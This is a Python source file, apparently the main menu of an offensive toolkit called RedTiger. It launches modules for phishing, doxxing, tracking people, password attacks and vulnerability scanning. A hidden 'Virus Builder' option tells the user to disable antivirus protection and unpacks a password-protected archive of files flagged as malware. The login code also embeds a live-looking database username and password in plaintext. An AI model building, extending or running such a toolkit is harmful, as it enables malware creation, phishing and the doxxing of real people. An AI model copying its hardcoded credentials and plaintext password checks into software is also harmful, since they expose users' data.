
from Program.Config.Config import *
from Program.Config.Util import *
from pymongo import MongoClient
import getpass 
try:
   import webbrowser
   import re
   import pyzipper
   from tkinter import messagebox
except Exception as e:
   ErrorModule(e)



def authenticate_user():
    try:
        # Prompt the user for email and password
        email = input("Enter your email (must be @bnmit.in): ")
        password = getpass.getpass("Enter your password: ")

        # Check if the email ends with @bnmit.in
        if not email.endswith("@bnmit.in"):
            print("Invalid email domain. Please use a valid bnmit.in email.")
            return False

        # Connect to the MongoDB database
        client = MongoClient("mongodb+srv://gudddenuf:welcome123@cluster0.ifxas.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
        db = client['tiger']
        collection = db['credentials']

        # Check if the email exists in the database and if the password matches
        user = collection.find_one({"email": email})
        if user and user['password'] == password:
            print("Authentication successful!")
            return True
        else:
            print("Incorrect email or password. Access denied.")
            return False
    except Exception as e:
        print(f"Error during authentication: {e}")
        return False


option_01 = "Website-Vulnerability-Scanner"
option_02 = "Website-Info-Scanner"
option_03 = "Website-Url-Scanner"
option_04 = "Ip-Scanner"
option_05 = "Ip-Port-Scanner"


option_11 = "Dox-Create"
option_12 = "Dox-Tracker"
option_13 = "Username-Tracker"
option_14 = "Email-Tracker"
option_15 = "Email-Lookup"
option_16 = "Phone-Number-Lookup"
option_17 = "Ip-Lookup"


option_21 = "Phishing-Attack"
option_22 = "Password-Decrypted-Attack"
option_23 = "Password-Encrypted"
option_24 = "Search-In-DataBase"
option_25 = "Dark-Web-Links"
option_26 = "Ip-Generator"



option_01_txt = f"{red}[{white}01{red}]{white} " + option_01.ljust(30)[:30].replace("-", " ")
option_02_txt = f"{red}[{white}02{red}]{white} " + option_02.ljust(30)[:30].replace("-", " ")
option_03_txt = f"{red}[{white}03{red}]{white} " + option_03.ljust(30)[:30].replace("-", " ")
option_04_txt = f"{red}[{white}04{red}]{white} " + option_04.ljust(30)[:30].replace("-", " ")
option_05_txt = f"{red}[{white}05{red}]{white} " + option_05.ljust(30)[:30].replace("-", " ")



option_11_txt = f"{red}[{white}06{red}]{white} " + option_11.ljust(30)[:30].replace("-", " ")
option_12_txt = f"{red}[{white}07{red}]{white} " + option_12.ljust(30)[:30].replace("-", " ")
option_13_txt = f"{red}[{white}08{red}]{white} " + option_13.ljust(30)[:30].replace("-", " ")
option_14_txt = f"{red}[{white}09{red}]{white} " + option_14.ljust(30)[:30].replace("-", " ")
option_15_txt = f"{red}[{white}10  {red}]{white} " + option_15.ljust(30)[:30].replace("-", " ")
option_16_txt = f"{red}[{white}11{red}]{white} " + option_16.ljust(30)[:30].replace("-", " ")
option_17_txt = f"{red}[{white}12{red}]{white} " + option_17.ljust(30)[:30].replace("-", " ")


option_21_txt = f"{red}[{white}13{red}]{white} " + option_21.ljust(30)[:30].replace("-", " ")
option_22_txt = f"{red}[{white}14{red}]{white} " + option_22.ljust(30)[:30].replace("-", " ")
option_23_txt = f"{red}[{white}15{red}]{white} " + option_23.ljust(30)[:30].replace("-", " ")
option_24_txt = f"{red}[{white}16{red}]{white} " + option_24.ljust(30)[:30].replace("-", " ")
option_25_txt = f"{red}[{white}17{red}]{white} " + option_25.ljust(30)[:30].replace("-", " ")
option_26_txt = f"{red}[{white}18{red}]{white} " + option_26.ljust(30)[:30].replace("-", " ")


menu1 = f"""                                                                                                        ─┐
 ├─          ┌─────────────────┐                        ┌───────┐                           ┌───────────┐            │
 └─┬─────────┤ Network Scanner ├─────────┬──────────────┤ Osint ├──────────────┬────────────┤ Utilities ├────────────┴─
   │         └─────────────────┘         │              └───────┘              │            └───────────┘
   ├─ {option_01_txt                    }├─ {option_11_txt                    }├─ {option_21_txt}
   ├─ {option_02_txt                    }├─ {option_12_txt                    }├─ {option_22_txt}
   ├─ {option_03_txt                    }├─ {option_13_txt                    }├─ {option_23_txt}
   ├─ {option_04_txt                    }├─ {option_14_txt                    }├─ {option_24_txt}
   ├─ {option_05_txt                    }├─ {option_15_txt                    }├─ {option_25_txt}
   └─                                    ├─ {option_16_txt                    }└─ {option_26_txt}
                                         └─ {option_17_txt                    }

"""



def Update():
   popup_version = ""
   try:
      new_version = re.search(r'version_tool\s*=\s*"([^"]+)"', requests.get(url_config).text).group(1)
      if new_version != version_tool:
         webbrowser.open(f"https://{github_tool}")
         colorama.init()
         input(f"{BEFORE + current_time_hour() + AFTER} {INFO} Please install the new version of the tool: {white + version_tool + red} -> {white + new_version} ")
         popup_version = f"{red}New Version: {white + version_tool + red} -> {white + new_version}"
         colorama.deinit()
   except: pass

   return popup_version

menu_path = os.path.join(tool_path, "Program", "Config", "Menu.txt")

def Menu():
   if not authenticate_user():
        print("Authentication failed. Exiting program.")
        exit(1)
   popup_version = Update()

   try:
      with open(menu_path, "r") as file:
         menu_number = file.read()
      menu_mapping = {"1": menu1}
      menu = menu_mapping.get(menu_number, menu1)
   except:
      menu = menu1
      menu_number = "1"

   banner = f"""{popup_version}                                                                                      
                                       ▄▄▄█████▓  ██▓  ▄████   ▓█████  ██▀███
                                       ▓  ██▒ ▓ ▒▓██▒  ██▒ ▀█  ▒▓█   ▀ ▓██ ▒ ██▒
                                       ▒ ▓██░ ▒ ░▒██▒ ▒██░▄▄▄  ░▒███   ▓██ ░▄█ ▒
                                       ░ ▓██▓ ░  ░██░ ░▓█  ██▓ ▒▓█  ▄ ▒██▀▀█▄
                                          ▒██▒  ░ ░██ ░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                                          ▒ ░░   ░▓   ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                                          ░     ▒ ░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
                                          ░       ▒ ░░ ░   ░    ░     ░░   ░
                                               
                                         
{menu}"""
   return banner, menu_number


while True:
   try:
      Clear()

      banner, menu_number = Menu()

      Title(f"Menu {menu_number}")
      Slow(MainColor(banner))

      choice = input(MainColor(f""" ┌──({white}{username_pc}@tiger)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))

      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
            menu_number = {"1": "2", "2": "3", "3": "1"}.get(menu_number, "1")
            with open(menu_path, "w") as file:
               file.write(menu_number)
            continue

      elif choice in ['B', 'b', 'BACK', 'Back', 'back']:
            menu_number = {"2": "1", "3": "2"}.get(menu_number, "1")
            with open(menu_path, "w") as file:
               file.write(menu_number)
            continue

      
      elif choice == '31':
         if os_name == "Linux":
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
            messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")

         print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(redtiger).zip")
            file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "VirusBuilderOptions.py")
            output = os.path.join(tool_path, "Program", "FileDetectedByAntivirus")
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(redtiger).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'redtiger'
                     zf.extractall(output)
                  time.sleep(3)
               else:
                  print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, please reinstall the tool.")
         except Exception as e:
            Error(e)

      options = {
         '01': option_01, '02': option_02, '03': option_03, '04': option_04,
         '05': option_05, 
         '06': option_11, '07': option_12,
         '08': option_13, '09': option_14, '10': option_15, '11': option_16,
         '12': option_17, 
         '13': option_21, '14': option_22, '15': option_23, '16': option_24,
         '17': option_25, '18': option_26,
      }

      if choice in options:  
         StartProgram(f"{options[choice]}.py")
      elif '0' + choice in options:
         StartProgram(f"{options['0' + choice]}.py")
      else:
         ErrorChoiceStart()

   except Exception as e:
      Error(e)